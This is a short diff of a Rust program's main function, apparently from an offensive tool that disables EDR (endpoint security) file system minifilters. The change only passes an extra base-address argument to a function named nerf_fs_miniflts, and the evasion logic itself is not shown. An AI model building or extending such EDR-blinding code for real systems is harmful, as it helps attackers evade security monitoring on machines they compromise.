@@ -190,7 +190,7 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
 
     // =-=-> Unhook EDR file system minifilter entries
     println!("[>] Targeting the file system minifilters.");
-    match xp::nerf_fs_miniflts(fm_offsets) {
+    match xp::nerf_fs_miniflts(fm_base as u64, fm_offsets) {
         Ok(_val) => {},
         Err(e) => eprintln!("[-] FS miniflt nerfing failed: {:?}", e),
     }
